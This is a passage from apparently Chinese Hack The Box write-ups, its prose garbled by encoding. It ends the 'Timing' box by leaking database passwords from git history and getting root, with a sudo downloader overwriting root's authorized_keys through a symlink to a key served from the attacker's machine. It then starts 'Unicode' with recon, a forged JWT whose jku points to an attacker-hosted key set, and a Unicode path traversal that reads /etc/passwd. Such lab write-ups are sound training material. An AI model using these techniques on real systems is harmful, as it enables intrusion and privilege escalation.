footer.php\ndrwxr-xr-x  8 root root 4096  7æœˆ 20 22:35 .git\n-rw-r--r--  1 root root 1498  7æœˆ 20 22:34 header.php\n-rw-r--r--  1 root root  507  7æœˆ 20 22:34 image.php\ndrwxr-xr-x  3 root root 4096  7æœˆ 20 22:34 images\n-rw-r--r--  1 root root  188  7æœˆ 20 22:34 index.php\ndrwxr-xr-x  2 root root 4096  7æœˆ 20 22:34 js\n-rw-r--r--  1 root root 2074  7æœˆ 20 22:34 login.php\n-rw-r--r--  1 root root  113  7æœˆ 20 22:34 logout.php\n-rw-r--r--  1 root root 3041  7æœˆ 20 22:34 profile.php\n-rw-r--r--  1 root root 1740  7æœˆ 20 22:34 profile_update.php\ndrwxr-xr-x  4 root root 4096 12æœˆ 31 17:42 source\n-rw-r--r--  1 root root  984  7æœˆ 20 22:34 upload.php\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup]\nâ””â”€# cd source \n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup/source]\nâ””â”€# ls -la\næ€»ç”¨é‡ 16\ndrwxr-xr-x 4 root root 4096 12æœˆ 31 17:42 .\ndrwxr-xr-x 7 root root 4096 12æœˆ 31 17:42 ..\ndrwxr-xr-x 5 root root 4096 12æœˆ 31 17:42 0-e4e214696159a25c69812571c8214d2bf8736a3f\ndrwxr-xr-x 5 root root 4096 12æœˆ 31 17:42 1-16de2698b5b122c93461298eab730d00273bd83e\n```\nç„¶åå¤šäº†ä¸¤ä¸ªæ–‡ä»¶å¤¹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/backup/source]\nâ””â”€# diff 0-e4e214696159a25c69812571c8214d2bf8736a3f/ 1-16de2698b5b122c93461298eab730d00273bd83e/                                                                                                              1 â¨¯\ndiff '--color=auto' 0-e4e214696159a25c69812571c8214d2bf8736a3f/commit-meta.txt 1-16de2698b5b122c93461298eab730d00273bd83e/commit-meta.txt\n1,3c1,4\n< tree fd7fb62599f9702baeb0abdc42a8a4b68e49ec23\n< author grumpy <grumpy@localhost.com> 1626820434 +0000\n< committer grumpy <grumpy@localhost.com> 1626820434 +0000\n---\n> tree dcbc181650833009145874df7da85b4c6d84b2ca\n> parent e4e214696159a25c69812571c8214d2bf8736a3f\n> author grumpy <grumpy@localhost.com> 1626820453 +0000\n> committer grumpy <grumpy@localhost.com> 1626820453 +0000\n5c6\n< init\n---\n> db_conn updated\n0-e4e214696159a25c69812571c8214d2bf8736a3f/css å’Œ 1-16de2698b5b122c93461298eab730d00273bd83e/css æœ‰å…±åŒçš„å­ç›®å½•\ndiff '--color=auto' 0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php 1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php\n2c2\n< $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');\n---\n> $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');\n0-e4e214696159a25c69812571c8214d2bf8736a3f/images å’Œ 1-16de2698b5b122c93461298eab730d00273bd83e/images æœ‰å…±åŒçš„å­ç›®å½•\n0-e4e214696159a25c69812571c8214d2bf8736a3f/js å’Œ 1-16de2698b5b122c93461298eab730d00273bd83e/js æœ‰å…±åŒçš„å­ç›®å½•\n```\næ•°æ®åº“å‡­è¯å·²è¢«ä¿®æ”¹ä¸ºS3cr3t\\_unGu3ss4bl3\\_p422w0Rdï¼Œç°åœ¨æˆ‘ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ssh aaron@10.10.11.135\naaron@10.10.11.135's password: \nWelcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri Dec 31 17:46:35 UTC 2021\n\n  System load:  0.0               Processes:           180\n  Usage of /:   51.5% of 4.85GB   Users logged in:     1\n  Memory usage: 18%               IP address for eth0: 10.10.11.135\n  Swap usage:   0%\n\n8 updates can be applied immediately.\n8 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Fri Dec 31 17:46:08 2021 from 10.10.14.52\naaron@timing:~$ whoami&&id\naaron\nuid=1000(aaron) gid=1000(aaron) groups=1000(aaron)\n```\næˆåŠŸç™»å½•aaronç”¨æˆ·\n\n```bash\naaron@timing:~$ cat user.txt \na3376cc0a8af0e0aa3f66bec0adec1d5\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶\n\n## æƒé™æå‡\n```bash\naaron@timing:~$ sudo -l\nMatching Defaults entries for aaron on timing:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser aaron may run the following commands on timing:\n    (ALL) NOPASSWD: /usr/bin/netutils\n```\né¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹sudoæƒé™\n\nå¯ä»¥ä»¥rootæƒé™æ‰§è¡Œ/usr/bin/netutilsè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç ”ç©¶ç ”ç©¶\n\n```bash\naaron@timing:~$ cat /usr/bin/netutils\n#! /bin/bash\njava -jar /root/netutils.jar\naaron@timing:~$ file /usr/bin/netutils\n/usr/bin/netutils: Bourne-Again shell script, ASCII text executable\n```\né¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ç±»å‹\n\nè¿™æ˜¯ä¸€ä¸ªbashè„šæœ¬ï¼ŒåŠŸèƒ½æ˜¯ä»æ ¹ç›®å½•ä¸‹è½½è¿è¡Œä¸€ä¸ªjavaæ–‡ä»¶ï¼Œæ‰§è¡Œä¸€ä¸‹è¯•è¯•\n\n```bash\naaron@timing:~$ sudo /usr/bin/netutils\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >>\n```\næ‰§è¡Œåç»™äº†æˆ‘ä»¬ä¸¤ä¸ªé€‰é¡¹ï¼ŒFTPè¿˜æ˜¯HTTPï¼Œè®¾ç½®ä¸€ä¸ªHTTPç„¶åä¸‹è½½æµ‹è¯•æ–‡ä»¶çœ‹çœ‹æŠŠ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# python3 -m http.server 80                                                                                                                                                                                 2 â¨¯\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n```bash\naaron@timing:~$ sudo /usr/bin/netutils\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >> 1\nEnter Url: 10.10.14.52/test.txt\nInitializing download: http://10.10.14.52/test.txt\nFile size: 14 bytes\nOpening output file test.txt\nServer unsupported, starting from scratch with one connection.\nStarting download\n\nDownloaded 14 byte in 0 seconds. (0.02 KB/s)\n\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >> 2\naaron@timing:~$ ls -la test.txt \n-rw-r--r-- 1 root root 14 Dec 31 17:58 test.txt\n```\næˆåŠŸä»æˆ‘ä»¬æœ¬åœ°ä¸‹è½½äº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æ˜¯rootæƒé™çš„ï¼Œé‚£å°±å¥½åŠäº†\n\næ¥ç€å¯¹rootè´¦æˆ·ä¸‹çš„.sshæ–‡ä»¶åˆ›å»ºä¸€ä¸ªé“¾æ¥\n\n```bash\naaron@timing:~$ ln -s /root/.ssh/authorized_keys keys\nln: failed to access 'keys': Permission denied\naaron@timing:~$ ls -la\ntotal 52\ndrwxr-x--x 5 aaron aaron 4096 Dec 31 18:06 .\ndrwxr-xr-x 3 root  root  4096 Dec  2 09:55 ..\nlrwxrwxrwx 1 root  root     9 Oct  5 15:33 .bash_history -> /dev/null\n-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc\ndrwx------ 2 aaron aaron 4096 Nov 29 01:34 .cache\ndrwx------ 3 aaron aaron 4096 Nov 29 01:34 .gnupg\nlrwxrwxrwx 1 aaron aaron   26 Dec 31 18:06 keys -> /root/.ssh/authorized_keys\ndrwxrwxr-x 3 aaron aaron 4096 Nov 29 01:34 .local\nlrwxrwxrwx 1 aaron aaron   11 Dec 31 17:54 passwd -> /etc/passwd\nlrwxrwxrwx 1 aaron aaron   11 Dec 31 18:02 passwd.0 -> /etc/passwd\n-rw-r--r-- 1 root  root  1735 Dec 31 17:57 passwd.1\nlrwxrwxrwx 1 aaron aaron   11 Dec 31 17:57 passwd.2 -> /etc/passwd\n-rw-r--r-- 1 root  root  1735 Dec 31 17:57 passwd.3\n-rw-r--r-- 1 root  root  1735 Dec 31 18:03 passwd.4\n-rw-r--r-- 1 aaron aaron  807 Apr  4  2018 .profile\n-rw-r--r-- 1 root  root    14 Dec 31 17:58 test.txt\n-rw-r----- 1 root  aaron   33 Dec 31 17:51 user.txt\nlrwxrwxrwx 1 root  root     9 Oct  5 15:33 .viminfo -> /dev/null\n```\næ¥ç€åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªsshçš„å¯†é’¥ï¼Œç„¶åå¤åˆ¶åˆ°æ¡Œé¢ï¼Œæ”¹åä¸ºkeys\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ssh-keygen       \nGenerating public/private rsa key pair.\nEnter file in which to save the key (/root/.ssh/id_rsa): \nEnter passphrase (empty for no passphrase): \nEnter same passphrase again: \nYour identification has been saved in /root/.ssh/id_rsa\nYour public key has been saved in /root/.ssh/id_rsa.pub\nThe key fingerprint is:\nSHA256:M12TnW2ZwayF1exH6fYv+fqbplhkdyxg/9oFI+yu7os root@root\nThe key's randomart image is:\n+---[RSA 3072]----+\n|              =+o|\n|             + BB|\n|            * *=o|\n|         . + = =o|\n|        S . oo*.=|\n|         o .o..=o|\n|            .. .+|\n|         . .o o++|\n|        Eo=+..=B=|\n+----[SHA256]-----+\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ls -la /root/.ssh                                                   \næ€»ç”¨é‡ 20\ndrwx------  2 root root 4096  1æœˆ  1 12:56 .\ndrwx------ 28 root root 4096  1æœˆ  1 12:56 ..\n-rw-------  1 root root 2590  1æœˆ  1 12:56 id_rsa\n-rw-r--r--  1 root root  563  1æœˆ  1 12:56 id_rsa.pub\n-rw-r--r--  1 root root 3772 12æœˆ 31 17:45 known_hosts\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cp /root/.ssh/id_rsa.pub keys     \n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ls               \nkeys\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\næ¥ç€ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡\n\n```bash\naaron@timing:~$ sudo /usr/bin/netutils\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >> 1\nEnter Url: http://10.10.14.52/keys\nInitializing download: http://10.10.14.52/keys\nFile size: 563 bytes\nOpening output file keys\nServer unsupported, starting from scratch with one connection.\nStarting download\n\nDownloaded 563 byte in 0 seconds. (0.91 KB/s)\n\nnetutils v0.1\nSelect one option:\n[0] FTP\n[1] HTTP\n[2] Quit\nInput >> 2\n```\næ¥ç€ä½¿ç”¨/usr/bin/netutilsæ¥ä¸‹è½½keys\n\nç„¶åä½¿ç”¨ssh -iè¿›è¡Œè¿æ¥ç™»å½•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€root)-[~/.ssh]\nâ””â”€# ssh -i id_rsa root@10.10.11.135\nWelcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat Jan  1 13:29:39 UTC 2022\n\n  System load:  0.0               Processes:           202\n  Usage of /:   48.7% of 4.85GB   Users logged in:     1\n  Memory usage: 10%               IP address for eth0: 10.10.11.135\n  Swap usage:   0%\n\n8 updates can be applied immediately.\n8 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Tue Dec  7 12:08:29 2021\nroot@timing:~# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™\n\n```bash\nroot@timing:~# ls\naxel  netutils.jar  root.txt\nroot@timing:~# cat root.txt \nc9e18f123e0e2012bbf16a0f64bc3715\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Unicode - Hackthebox","url":"/2021/12/16/Hackthebox/Medium/Hackthebox-Unicode/","content":"\n# Hackthebox - Unicode\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Unicode/711534dd-e3e3-455e-b9cb-477b4f00229b.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Unicode/c4a1fa84-f27c-471e-a92f-7837ccb7d6ef.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.126 \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 01:22 EST\nNmap scan report for 10.10.11.126\nHost is up (0.22s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)\n|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)\n|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-generator: Hugo 0.83.1\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Hackmedia\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=12/4%OT=22%CT=1%CU=41014%PV=Y%DS=2%DC=T%G=Y%TM=61AB094\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=C)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   217.74 ms 10.10.14.1\n2   217.99 ms 10.10.11.126\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 48.13 seconds\n```\nè¿™é‡Œåªæ‰«æåˆ°22å’Œ80ç«¯å£ï¼Œå»80ç«¯å£çœ‹ä¸€ä¸‹httpæœåŠ¡å†…å®¹\n\n![](Hackthebox-Unicode/2ace0ac1-bc26-4f62-8df2-77d340d116f8.png)\n\nè¿™å¥½åƒæ˜¯ä¸€ä¸ªå¨èƒæƒ…æŠ¥å…¬å¸çš„å®˜ç½‘ï¼Œè€è§„çŸ©ï¼Œä¸€è¾¹æ‰«æç›®å½•ï¼Œä¸€è¾¹çœ‹ç½‘ç«™\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.11.126/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 9294\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.126/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 9294\n________________________________________________\n\n.                       [Status: 200, Size: 2078, Words: 363, Lines: 69]\n:: Progress: [43003/43003] :: Job [1/1] :: 155 req/sec :: Duration: [0:04:48] :: Errors: 0 ::\n```\nåŠ äº†è¿‡æ»¤åæ²¡æ‰«å‡ºæ¥ä¸œè¥¿ï¼Œåªèƒ½å»ä¸€ä¸ªä¸ªåŠŸèƒ½æ£€æŸ¥äº†\n\n![](Hackthebox-Unicode/f83a3bbd-edc9-4310-a68c-81c3be8e67ba.png)\n\néšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·å»è¯•è¯•èƒ½ä¸èƒ½ç™»å½•\n\n![](Hackthebox-Unicode/3a7cf3fd-6abb-4f17-9ebd-319954c86f64.png)\n\nç™»å½•åçš„é¡µé¢ï¼Œåˆ°å¤„çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ç‚¹å§\n\nçœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ è¯•è¯•å§\n\n![](Hackthebox-Unicode/5c0f041a-46e7-4e08-9fbe-d8f7d5ff86d3.png)\n\n![](Hackthebox-Unicode/4a791ef7-ea19-4932-8a1d-54a31c69d157.png)\n\nä¼ æ˜¯å¯ä»¥ä¼ çš„ï¼Œä½†æ˜¯æ„Ÿè§‰æ— æ³•æ‰§è¡Œå’Œä¸çŸ¥é“ä¸Šä¼ åçš„åœ°å€ï¼Œæ”¾å¼ƒï¼Œçœ‹çœ‹å…¶ä»–æ€è·¯\n\n![](Hackthebox-Unicode/821d7155-9197-42c3-be59-e32c813bb26a.png)\n\næŸ¥çœ‹äº†ä¸€ä¸‹cookieï¼Œè«åè§‰å¾—çœ¼ç†Ÿï¼Œè¿™ä¸æ˜¯JWTå—\n\nå¤åˆ¶åˆ°JWT.IOå»çœ‹çœ‹\n\n> [https://jwt.io/](https://jwt.io/)\n\n![](Hackthebox-Unicode/daead21a-787b-49e4-9ea1-42b488c35491.png)\n\nè·å¾—äº†ä¸€ä¸ªæ–°çš„URL **http://hackmedia.htb/static/jwks.json**\n\næˆ‘ä»¬æŠŠè¿™ä¸ªé¡µé¢æ·»åŠ åˆ°hostsé‡Œ\n\n```bash\necho 10.10.11.126 hackmedia.htb >> /etc/hosts\n```\n![](Hackthebox-Unicode/b0fa0124-6006-40ec-95a2-b2764096dfb1.png)\n\nç„¶åå†å»è®¿é—®è¿™ä¸ªURL\n\nå°†è·å–åˆ°çš„jsonä¿å­˜åˆ°æœ¬åœ°\n\n```bash\ncurl http://hackmedia.htb/static/jwks.json > jwks.json\n```\n> [https://hackernoon.com/json-web-tokens-jwt-demystified-f7e202249640](https://hackernoon.com/json-web-tokens-jwt-demystified-f7e202249640)\n\n> [https://openid.net/specs/draft-jones-json-web-key-03.html#Acknowledgements](https://openid.net/specs/draft-jones-json-web-key-03.html#Acknowledgements)\n\næ‰¾åˆ°ä¸¤ç¯‡jwtç›¸å…³çš„æ–‡ç« ï¼Œå¤§å®¶æœ‰å…´è¶£çš„è‡ªå·±çœ‹ä¸€ä¸‹å§ï¼Œæˆ‘å°±ä¸è¯¦ç»†è®²è§£äº†\n\n> [https://mkjwk.org/](https://mkjwk.org/)\n\nä½¿ç”¨åœ¨çº¿å·¥å…·ç”Ÿæˆä¸€ä¸ªjwtçš„key\n\n![](Hackthebox-Unicode/0ab6f077-6a92-4a4a-98ce-7ed9d9368c5d.png)\n\nç„¶åä½¿ç”¨æˆ‘ä»¬ç”Ÿæˆå‡ºæ¥çš„jsoné‡Œçš„nå€¼ï¼Œæ›¿æ¢æ‰æˆ‘ä»¬ä¿å­˜çš„jsoné‡Œçš„nå€¼\n\n![](Hackthebox-Unicode/b50647b2-5227-4025-b73a-c5157e153432.png)\n\n## æ¼æ´åˆ©ç”¨\nä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# python3 -m http.server 80                                                      \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n![](Hackthebox-Unicode/e326b6a3-ef67-4583-ab14-b10833e0e072.png)\n\nç”¨adminæ›¿æ¢æ‰æˆ‘ä»¬çš„ç”¨æˆ·åï¼Œç„¶åå°†æ–°ç”Ÿæˆçš„keyå¡«å…¥åç”Ÿæˆæ–°çš„JWTä»¤ç‰Œ\n\n```bash\n{\n  \"typ\": \"JWT\",\n  \"alg\": \"RS256\",\n  \"jku\": \"http://hackmedia.htb/static/../redirect?url=10.10.14.14/jwks.json\"\n}\n```\n```bash\neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMTQvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.BKe3g8gh_oyrQIjTOgSh4AqIKTHI79jQQhSG1t-jVxx0pvXL0yCAJi0gXvKpNSbKG_cVpzXlVT4e_mNmfF1-IqoneHTmkhEAMFR0ZT4AeVykvDFTlqaKJj2mgjTcXZ_S8odcWAQNRuzondUaOjRT9wr-_CrPm5xkbUwX_mu3p2jM1AWFISba8XM6bcnIBalRb398-7KJIveBaOhqmjEVdV4voFaBBMU7vS8yS4hhhzgE6NdvxiHPIeSFUYGpD9HcZXPmIgNAY1UmJjwMrF0n1N_MFGB_7oCK5KlTq4IIx4qRGQ8_JhAw8haQbC1jwC6A3zlHzqMVSfoafd6BdtYZ4A\n```\n![](Hackthebox-Unicode/fb86d951-b6db-4e86-bb44-31bcdecc09d6.png)\n\n```bash\nhttp://hackmedia.htb/login/\n```\nå¾—åˆ°äº†æˆ‘ä»¬çš„æ–°çš„ä»¤ç‰Œï¼Œç„¶åå»æ›¿æ¢æ‰ä»¤ç‰Œ\n\næ›¿æ¢æ‰ä»¥ååˆ·æ–°é¡µé¢\n\n![](Hackthebox-Unicode/1970487f-a491-4114-97c6-f22af254c80e.png)\n\næˆåŠŸè¿›å…¥åå°\n\n![](Hackthebox-Unicode/df0a2712-b52f-4d76-91bb-fe0a3a185a4f.png)\n\nç‚¹å‡»è¿™ä¿©éšä¾¿ä¸€ä¸ªï¼Œä¼šè·³è½¬åˆ°å¯¹åº”çš„pdfæ–‡ä»¶ï¼Œè¿™é‡Œç»è¿‡å„ç§æµ‹è¯•ï¼Œç„¶åä¸æœ‹å‹æ²Ÿé€šåï¼Œå‘ç°å¯èƒ½æ˜¯ç”±äºæµè§ˆå™¨æœºåˆ¶çš„åŸå› ï¼Œå¯¼è‡´ä½¿ç”¨Firefoxä¼šæœ‰ç‚¹é—®é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘æ¢æˆäº†Chromeæ¥æ‰§è¡Œ\n\n![](Hackthebox-Unicode/dd90b81c-6f87-4ec3-b1bf-ceebc62f9bb5.png)\n\nçœ‹ç€è¿™ä¸ªç»“æ„ï¼Œæˆ‘æ„Ÿè§‰æœ‰æœ¬åœ°æ–‡ä»¶è¯»å–çš„æ¼æ´ï¼Œæµ‹ä¸€ä¸‹\n\n![](Hackthebox-Unicode/c455995a-d83c-4f68-9dde-0ec54d56ab54.png)\n\nè¿™é‡Œ404äº†ï¼Œä½†æ˜¯å´æç¤ºäº†æˆ‘ä»¬æœ‰è¿‡æ»¤ï¼Œå¹¶ä¸”è¯´æˆ‘ä»¬æ°¸è¿œä¹Ÿè¿‡ä¸å»è¿™ä¸ªè¿‡æ»¤ï¼Ÿ\n\nè¿™æˆ‘å°±ä¸æœäº†ï¼Œä¸å°±unicodeå—ï¼Œç»•ä»–ä¸«çš„\n\n> [https://lazarv.com/posts/unicode-normalization-vulnerabilities/](https://lazarv.com/posts/unicode-normalization-vulnerabilities/)\n\n![](Hackthebox-Unicode/d28f11dd-44d6-4c8a-b956-a911302576fe.png)\n\n![](Hackthebox-Unicode/99cc7f8c-a1fe-4835-96d1-f7c4fdc2848c.png)\n\nçœ‹æ ·å­è¿‡æ»¤æ˜¯ç»•è¿‡å»äº†ï¼Œä½†æ˜¯æ²¡è®¿é—®åˆ°æ–‡ä»¶ï¼Œé‚£å°±å±‚æ•°ä¸å¤Ÿå˜›ï¼Œå†å¤šåŠ å‡ å±‚å°±å¥½äº†\n\n![](Hackthebox-Unicode/3e9a2e3f-8143-434c-a1f5-f95d23692fd6.png)\n\n```bash\nhttp://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd\n```\nè¿™ä¸å°±è¯»å–åˆ°äº†å—\n\n```bash\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nmysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false\ncode:x:1000:1000:,,,:/home/code:/bin/bash\n```\nè¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ªmysqlçš„æƒé™ç»„ï¼Œå»è¯»å–mysqlçš„å¯†ç 